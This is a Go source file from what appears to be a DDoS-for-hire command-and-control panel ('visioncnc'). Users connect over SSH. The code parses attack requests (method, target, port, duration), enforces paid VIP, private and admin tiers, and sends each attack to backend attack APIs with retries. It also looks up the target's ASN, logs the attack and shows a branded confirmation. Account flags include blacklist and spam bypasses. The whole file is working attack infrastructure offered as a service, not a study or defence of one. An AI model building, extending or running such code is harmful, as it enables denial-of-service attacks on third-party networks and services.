package managers

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strconv"
	"sync"
	"time"
	"visioncnc/database"
	"visioncnc/utils"

	"github.com/gliderlabs/ssh"
)

// Attack holds the parameters for an attack request
type Attack struct {
	Duration   uint32
	Target     string
	Port       string
	MethodName string
	Method     utils.Method
	Enabled    bool
}

// NewAttack validates and creates a new attack from user arguments
func NewAttack(session ssh.Session, args []string, vip bool, private bool, admin bool, maxtime int, db *database.Database) (*Attack, error) {
	if len(args) < 4 {
		return nil, errors.New("Invalid arguments. Usage: <method> <target> <port> <duration>")
	}

	method, err := utils.GetMethod(args[0])
	if err != nil {
		return nil, err
	}

	// Permission checks
	if utils.HasVipPermission(method.Method) && !vip {
		return nil, errors.New("VIP permission required for this method")
	}
	if utils.HasPrivatePermission(method.Method) && !private {
		return nil, errors.New("Private permission required for this method")
	}
	if utils.HasAdminPermission(method.Method) && !admin {
		return nil, errors.New("Admin permission required for this method")
	}

	atk := &Attack{
		MethodName: args[0],
		Target:     args[1],
		Method:     method,
		Enabled:    method.Enabled,
	}

	port, err := strconv.Atoi(args[2])
	if err != nil {
		return nil, errors.New("Invalid port")
	}
	atk.Port = strconv.Itoa(port)

	duration, err := strconv.Atoi(args[3])
	if err != nil || uint32(duration) < method.MinTime || uint32(duration) > method.MaxTime || duration > maxtime {
		return nil, fmt.Errorf("Invalid duration. Must be between %d and %d seconds", method.MinTime, method.MaxTime)
	}
	atk.Duration = uint32(duration)

	return atk, nil
}

// Build sends the attack to API endpoints and returns the branding message.
func (this *Attack) Build(session ssh.Session, db *database.Database, config *utils.Config) (bool, error, string) {
	userInfo := db.GetAccountInfo(session.User())

	if !this.Enabled {
		return false, errors.New("Method not enabled"), ""
	}

	// Select API endpoints based on api_mode
	selected := utils.SelectAPIs(this.MethodName, this.Method.ApiMode, this.Method.API)

	// Determine HTTP timeout
	timeout := 2 * time.Second
	if this.Method.ApiTimeout > 0 {
		timeout = time.Duration(this.Method.ApiTimeout) * time.Second
	}

	// Send API requests in background
	go func() {
		client := &http.Client{
			Transport: &http.Transport{
				MaxIdleConns:        100,
				MaxIdleConnsPerHost: 100,
				IdleConnTimeout:     30 * time.Second,
			},
			Timeout: timeout,
		}

		var wg sync.WaitGroup
		for _, entry := range selected {
			finalURL := utils.ReplacePlaceholders(entry.URL, this.MethodName, this.Target, this.Port, this.Duration)
			wg.Add(1)
			go func(url, label string) {
				defer wg.Done()
				maxAttempts := 1 + this.Method.ApiRetry
				for attempt := 0; attempt < maxAttempts; attempt++ {
					res, err := client.Get(url)
					if err != nil {
						utils.RecordAPIError(url, label)
						log.Printf("[ATTACK] Error on %s (attempt %d): %v", label, attempt+1, err)
						continue
					}
					io.Copy(io.Discard, res.Body)
					res.Body.Close()
					utils.RecordAPISuccess(url, label)
					log.Printf("[ATTACK] %s → sent (HTTP %d)", label, res.StatusCode)
					break
				}
			}(finalURL, entry.Label)
		}
		wg.Wait()
		log.Printf("[INFO] Attack dispatched to %d endpoint(s)", len(selected))
	}()

	// Fetch target ASN info
	dataMap := fetchASNInfoC2(this.Target, config)

	// Log attack event
	lm := GetSharedLogManager()
	if lm != nil {
		lm.LogEvent("attack_sent", map[string]string{
			"source":   "C2",
			"username": session.User(),
			"target":   this.Target,
			"port":     this.Port,
			"time":     strconv.Itoa(int(this.Duration)),
			"method":   this.MethodName,
			"layer":    this.Method.Group,
			"country":  dataMap["country"],
			"org":      dataMap["org"],
			"region":   dataMap["region"],
		})
	}

	// Build attack-sent branding message
	expiryTime, _ := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	sentMessage := utils.Branding(session, "attack-sent", map[string]interface{}{
		"attack.Target":            this.Target,
		"attack.Port":              this.Port,
		"attack.Time":              strconv.Itoa(int(this.Duration)),
		"attack.Method":            this.MethodName,
		"attack.Country":           dataMap["country"],
		"attack.Org":               dataMap["org"],
		"attack.Region":            dataMap["region"],
		"attack.Date":              time.Now().Format("2006-01-02 15:04:05"),
		"user.Username":            session.User(),
		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
		"user.Admin":               utils.CalculateInt(userInfo.Admin),
		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
		"user.Private":             utils.CalculateInt(userInfo.Private),
		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
		"user.SSH_Client":          session.Context().ClientVersion(),
		"user.Created_by":          userInfo.CreatedBy,
		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
		"clear":                    "\x1b[2J \x1b[H",
	})
	log.Println("Attack information sent to user interface")
	return false, nil, sentMessage
}

// fetchASNInfoC2 retrieves country/org/region for a target IP or URL.
func fetchASNInfoC2(target string, config *utils.Config) map[string]string {
	unknown := map[string]string{"country": "Unknown", "org": "Unknown", "region": "Unknown"}

	var apiURL string
	if len(target) > 4 && (target[:7] == "http://" || target[:4] == "www.") {
		apiURL = "http://" + config.ProxyURL + "/?ip=" + target
	} else {
		apiURL = "https://ipinfo.io/" + target + "/json?token=" + config.IpinfoToken
	}

	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Get(apiURL)
	if err != nil {
		log.Println("[!] Failed to retrieve ASN info:", err)
		return unknown
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return unknown
	}

	var result struct {
		Country string `json:"country"`
		Org     string `json:"org"`
		Region  string `json:"region"`
	}
	if json.Unmarshal(body, &result) != nil {
		return unknown
	}
	return map[string]string{
		"country": result.Country,
		"org":     result.Org,
		"region":  result.Region,
	}
}

// Contains checks if a method name exists in the methods list
func Contains(methods []utils.Method, s string) bool {
	for _, a := range methods {
		if a.Method == s {
			return true
		}
	}
	return false
}

// ValidIP4 checks if a string is a valid IP address
func ValidIP4(s string) bool {
	return net.ParseIP(s) != nil
}
